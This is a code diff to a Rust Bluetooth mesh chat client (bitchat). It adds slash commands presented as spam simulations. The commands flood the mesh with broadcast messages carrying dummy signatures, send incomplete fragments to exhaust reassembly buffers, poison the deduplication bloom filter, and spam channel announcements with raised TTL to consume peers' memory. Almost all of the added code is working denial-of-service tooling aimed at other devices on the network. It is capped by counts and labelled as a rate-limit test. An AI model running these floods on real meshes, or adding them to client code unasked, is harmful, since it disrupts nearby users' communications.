@@ -15,6 +15,17 @@ use crate::packet_delivery::send_channel_announce;
 use crate::payload_handling::create_bitchat_message_payload_full;
 use crate::fragmentation::send_packet_with_fragmentation;
 use crate::noise_session::NoiseSessionManager;
+use uuid::Uuid;
+use rand::Rng;
+use tokio::time::{sleep, Duration};
+use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
+
+// Global simulation state
+static SIMULATION_ACTIVE: AtomicBool = AtomicBool::new(false);
+static MESSAGES_SENT: AtomicU64 = AtomicU64::new(0);
+static FRAGMENTS_SENT: AtomicU64 = AtomicU64::new(0);
+static BLOOM_MESSAGES_SENT: AtomicU64 = AtomicU64::new(0);
+static CHANNELS_CREATED: AtomicU64 = AtomicU64::new(0);
 
 
 
@@ -725,5 +736,362 @@ pub async fn handle_transfer_command(
         }
         return true;
     }
+    false
+}
+
+// === SPAM SIMULATION COMMANDS ===
+
+/// Message flooding simulation - sends rapid messages to test rate limiting
+pub async fn handle_spam_flood_command(
+    line: &str,
+    nickname: &str,
+    my_peer_id: &str,
+    chat_context: &ChatContext,
+    _password_protected_channels: &HashSet<String>,
+    _channel_keys: &mut HashMap<String, [u8; 32]>,
+    _encryption_service: &EncryptionService,
+    _delivery_tracker: &mut DeliveryTracker,
+    peripheral: &Peripheral,
+    cmd_char: &btleplug::api::Characteristic,
+    ui_tx: mpsc::Sender<String>,
+) -> bool {
+    if line.starts_with("/spam_flood ") {
+        let parts: Vec<&str> = line.split_whitespace().collect();
+        if parts.len() < 2 {
+            let _ = ui_tx.send("Usage: /spam_flood <count> [delay_ms]\nExample: /spam_flood 100 50\n".to_string()).await;
+            return true;
+        }
+        
+        let count: u32 = parts[1].parse().unwrap_or(10);
+        let delay_ms: u64 = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(100);
+        
+        if count > 1000 {
+            let _ = ui_tx.send("⚠️ Limiting flood to 1000 messages for safety\n".to_string()).await;
+            return true;
+        }
+        
+        SIMULATION_ACTIVE.store(true, Ordering::Relaxed);
+        MESSAGES_SENT.store(0, Ordering::Relaxed);
+        
+        let _ = ui_tx.send(format!("🔥 Starting message flood: {} messages with {}ms delay\n", count, delay_ms)).await;
+        
+        // Clone necessary data for async task
+        let ui_tx_clone = ui_tx.clone();
+        let nickname_clone = nickname.to_string();
+        let my_peer_id_clone = my_peer_id.to_string();
+        let current_channel = chat_context.current_mode.get_channel().map(|s| s.to_string());
+        let peripheral_clone = peripheral.clone();
+        let cmd_char_clone = cmd_char.clone();
+        
+        // Spawn flood task
+        tokio::spawn(async move {
+            for i in 0..count {
+                if !SIMULATION_ACTIVE.load(Ordering::Relaxed) {
+                    break;
+                }
+                
+                let spam_message = format!("FLOOD_TEST_{:04}_{}", i, Uuid::new_v4().to_string()[..8].to_uppercase());
+                
+                // Create message payload
+                let (message_payload, _) = create_bitchat_message_payload_full(
+                    &nickname_clone, 
+                    &spam_message, 
+                    current_channel.as_deref(), 
+                    false, 
+                    &my_peer_id_clone
+                );
+                
+                // Create and send packet
+                let signature = vec![0u8; 64]; // Dummy signature for flood test
+                let message_packet = create_bitchat_packet_with_recipient_and_signature(
+                    &my_peer_id_clone,
+                    "",  // Broadcast
+                    MessageType::Message,
+                    message_payload,
+                    Some(signature)
+                );
+                
+                if peripheral_clone.write(&cmd_char_clone, &message_packet, WriteType::WithoutResponse).await.is_ok() {
+                    MESSAGES_SENT.fetch_add(1, Ordering::Relaxed);
+                }
+                
+                if delay_ms > 0 {
+                    sleep(Duration::from_millis(delay_ms)).await;
+                }
+            }
+            
+            let final_count = MESSAGES_SENT.load(Ordering::Relaxed);
+            let _ = ui_tx_clone.send(format!("✅ Flood simulation complete: {} messages sent\n", final_count)).await;
+            SIMULATION_ACTIVE.store(false, Ordering::Relaxed);
+        });
+        
+        return true;
+    }
+    false
+}
+
+/// Fragment bombing simulation - sends incomplete fragments to exhaust reassembly buffers
+pub async fn handle_spam_fragment_command(
+    line: &str,
+    my_peer_id: &str,
+    peripheral: &Peripheral,
+    cmd_char: &btleplug::api::Characteristic,
+    ui_tx: mpsc::Sender<String>,
+) -> bool {
+    if line.starts_with("/spam_fragment ") {
+        let parts: Vec<&str> = line.split_whitespace().collect();
+        if parts.len() < 2 {
+            let _ = ui_tx.send("Usage: /spam_fragment <count> [size_kb]\nExample: /spam_fragment 50 2\n".to_string()).await;
+            return true;
+        }
+        
+        let count: u32 = parts[1].parse().unwrap_or(10);
+        let size_kb: u32 = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(1);
+        
+        if count > 100 {
+            let _ = ui_tx.send("⚠️ Limiting fragment bomb to 100 incomplete fragments for safety\n".to_string()).await;
+            return true;
+        }
+        
+        SIMULATION_ACTIVE.store(true, Ordering::Relaxed);
+        FRAGMENTS_SENT.store(0, Ordering::Relaxed);
+        
+        let _ = ui_tx.send(format!("💣 Starting fragment bomb: {} incomplete fragments of {}KB each\n", count, size_kb)).await;
+        
+        // Clone for async task
+        let ui_tx_clone = ui_tx.clone();
+        let my_peer_id_clone = my_peer_id.to_string();
+        let peripheral_clone = peripheral.clone();
+        let cmd_char_clone = cmd_char.clone();
+        
+        tokio::spawn(async move {
+            for _i in 0..count {
+                if !SIMULATION_ACTIVE.load(Ordering::Relaxed) {
+                    break;
+                }
+                
+                // Generate random fragment ID
+                let mut fragment_id = [0u8; 8];
+                rand::thread_rng().fill(&mut fragment_id);
+                
+                // Create first fragment only (incomplete)
+                let fake_data = vec![0xAB; size_kb as usize * 1024];
+                let mut fragment_payload = Vec::new();
+                fragment_payload.extend_from_slice(&fragment_id);
+                fragment_payload.extend_from_slice(&[0u8, 0u8]); // Index 0
+                fragment_payload.extend_from_slice(&[0u8, 10u8]); // Total 10 fragments (but we only send first)
+                fragment_payload.push(MessageType::Message as u8); // Original type
+                fragment_payload.extend_from_slice(&fake_data[..150]); // First chunk only
+                
+                let fragment_packet = create_bitchat_packet(
+                    &my_peer_id_clone,
+                    MessageType::FragmentStart,
+                    fragment_payload
+                );
+                
+                if peripheral_clone.write(&cmd_char_clone, &fragment_packet, WriteType::WithoutResponse).await.is_ok() {
+                    FRAGMENTS_SENT.fetch_add(1, Ordering::Relaxed);
+                }
+                
+                sleep(Duration::from_millis(100)).await;
+            }
+            
+            let final_count = FRAGMENTS_SENT.load(Ordering::Relaxed);
+            let _ = ui_tx_clone.send(format!("✅ Fragment bomb complete: {} incomplete fragments sent\n", final_count)).await;
+            SIMULATION_ACTIVE.store(false, Ordering::Relaxed);
+        });
+        
+        return true;
+    }
+    false
+}
+
+/// Bloom filter poisoning - sends messages with unique IDs to exhaust filter capacity
+pub async fn handle_spam_bloom_command(
+    line: &str,
+    nickname: &str,
+    my_peer_id: &str,
+    peripheral: &Peripheral,
+    cmd_char: &btleplug::api::Characteristic,
+    ui_tx: mpsc::Sender<String>,
+) -> bool {
+    if line.starts_with("/spam_bloom ") {
+        let parts: Vec<&str> = line.split_whitespace().collect();
+        if parts.len() < 2 {
+            let _ = ui_tx.send("Usage: /spam_bloom <count>\nExample: /spam_bloom 600\n".to_string()).await;
+            return true;
+        }
+        
+        let count: u32 = parts[1].parse().unwrap_or(100);
+        
+        if count > 1000 {
+            let _ = ui_tx.send("⚠️ Limiting bloom poisoning to 1000 messages for safety\n".to_string()).await;
+            return true;
+        }
+        
+        SIMULATION_ACTIVE.store(true, Ordering::Relaxed);
+        BLOOM_MESSAGES_SENT.store(0, Ordering::Relaxed);
+        
+        let _ = ui_tx.send(format!("☠️ Starting bloom filter poisoning: {} unique message IDs\n", count)).await;
+        
+        // Clone for async task
+        let ui_tx_clone = ui_tx.clone();
+        let nickname_clone = nickname.to_string();
+        let my_peer_id_clone = my_peer_id.to_string();
+        let peripheral_clone = peripheral.clone();
+        let cmd_char_clone = cmd_char.clone();
+        
+        tokio::spawn(async move {
+            for _i in 0..count {
+                if !SIMULATION_ACTIVE.load(Ordering::Relaxed) {
+                    break;
+                }
+                
+                // Create message with unique ID to poison bloom filter
+                let unique_content = format!("BLOOM_POISON_{}", Uuid::new_v4());
+                let (message_payload, _) = create_bitchat_message_payload_full(
+                    &nickname_clone,
+                    &unique_content,
+                    None, // Public channel
+                    false,
+                    &my_peer_id_clone
+                );
+                
+                let signature = vec![0u8; 64];
+                let message_packet = create_bitchat_packet_with_recipient_and_signature(
+                    &my_peer_id_clone,
+                    "",
+                    MessageType::Message,
+                    message_payload,
+                    Some(signature)
+                );
+                
+                if peripheral_clone.write(&cmd_char_clone, &message_packet, WriteType::WithoutResponse).await.is_ok() {
+                    BLOOM_MESSAGES_SENT.fetch_add(1, Ordering::Relaxed);
+                }
+                
+                sleep(Duration::from_millis(50)).await;
+            }
+            
+            let final_count = BLOOM_MESSAGES_SENT.load(Ordering::Relaxed);
+            let _ = ui_tx_clone.send(format!("✅ Bloom poisoning complete: {} unique messages sent\n", final_count)).await;
+            SIMULATION_ACTIVE.store(false, Ordering::Relaxed);
+        });
+        
+        return true;
+    }
+    false
+}
+
+/// Channel creation spam - creates many channels to consume memory
+pub async fn handle_spam_channels_command(
+    line: &str,
+    my_peer_id: &str,
+    peripheral: &Peripheral,
+    cmd_char: &btleplug::api::Characteristic,
+    ui_tx: mpsc::Sender<String>,
+) -> bool {
+    if line.starts_with("/spam_channels ") {
+        let parts: Vec<&str> = line.split_whitespace().collect();
+        if parts.len() < 2 {
+            let _ = ui_tx.send("Usage: /spam_channels <count>\nExample: /spam_channels 50\n".to_string()).await;
+            return true;
+        }
+        
+        let count: u32 = parts[1].parse().unwrap_or(10);
+        
+        if count > 200 {
+            let _ = ui_tx.send("⚠️ Limiting channel spam to 200 channels for safety\n".to_string()).await;
+            return true;
+        }
+        
+        SIMULATION_ACTIVE.store(true, Ordering::Relaxed);
+        CHANNELS_CREATED.store(0, Ordering::Relaxed);
+        
+        let _ = ui_tx.send(format!("📺 Starting channel creation spam: {} channels\n", count)).await;
+        
+        // Clone for async task
+        let ui_tx_clone = ui_tx.clone();
+        let my_peer_id_clone = my_peer_id.to_string();
+        let peripheral_clone = peripheral.clone();
+        let cmd_char_clone = cmd_char.clone();
+        
+        tokio::spawn(async move {
+            for i in 0..count {
+                if !SIMULATION_ACTIVE.load(Ordering::Relaxed) {
+                    break;
+                }
+                
+                let channel_name = format!("#spam_test_{:04}_{}", i, Uuid::new_v4().to_string()[..6].to_uppercase());
+                
+                // Create channel announce packet
+                let payload = format!("{}|1|{}|{}", channel_name, my_peer_id_clone, hex::encode([0u8; 32]));
+                let mut announce_packet = create_bitchat_packet(
+                    &my_peer_id_clone,
+                    MessageType::ChannelAnnounce,
+                    payload.into_bytes()
+                );
+                
+                // Set TTL for wider propagation
+                if announce_packet.len() > 2 {
+                    announce_packet[2] = 5;
+                }
+                
+                if peripheral_clone.write(&cmd_char_clone, &announce_packet, WriteType::WithoutResponse).await.is_ok() {
+                    CHANNELS_CREATED.fetch_add(1, Ordering::Relaxed);
+                }
+                
+                sleep(Duration::from_millis(200)).await;
+            }
+            
+            let final_count = CHANNELS_CREATED.load(Ordering::Relaxed);
+            let _ = ui_tx_clone.send(format!("✅ Channel spam complete: {} channels created\n", final_count)).await;
+            SIMULATION_ACTIVE.store(false, Ordering::Relaxed);
+        });
+        
+        return true;
+    }
+    false
+}
+
+/// Show simulation status and stop active simulations
+pub async fn handle_spam_status_command(
+    line: &str,
+    ui_tx: mpsc::Sender<String>,
+) -> bool {
+    if line == "/spam_status" {
+        let is_active = SIMULATION_ACTIVE.load(Ordering::Relaxed);
+        let messages = MESSAGES_SENT.load(Ordering::Relaxed);
+        let fragments = FRAGMENTS_SENT.load(Ordering::Relaxed);
+        let bloom_msgs = BLOOM_MESSAGES_SENT.load(Ordering::Relaxed);
+        let channels = CHANNELS_CREATED.load(Ordering::Relaxed);
+        
+        let status = if is_active { "🔴 ACTIVE" } else { "🟢 IDLE" };
+        
+        let status_msg = format!(
+            "📊 Spam Simulation Status: {}\n\
+             ├─ Messages sent: {}\n\
+             ├─ Fragments sent: {}\n\
+             ├─ Bloom messages: {}\n\
+             └─ Channels created: {}\n\n\
+             Commands:\n\
+             • /spam_flood <count> [delay_ms] - Message flooding\n\
+             • /spam_fragment <count> [size_kb] - Fragment bombing\n\
+             • /spam_bloom <count> - Bloom filter poisoning\n\
+             • /spam_channels <count> - Channel creation spam\n\
+             • /spam_stop - Stop active simulation\n",
+            status, messages, fragments, bloom_msgs, channels
+        );
+        
+        let _ = ui_tx.send(status_msg).await;
+        return true;
+    }
+    
+    if line == "/spam_stop" {
+        SIMULATION_ACTIVE.store(false, Ordering::Relaxed);
+        let _ = ui_tx.send("🛑 Stopping all spam simulations...\n".to_string()).await;
+        return true;
+    }
+    
     false
 }
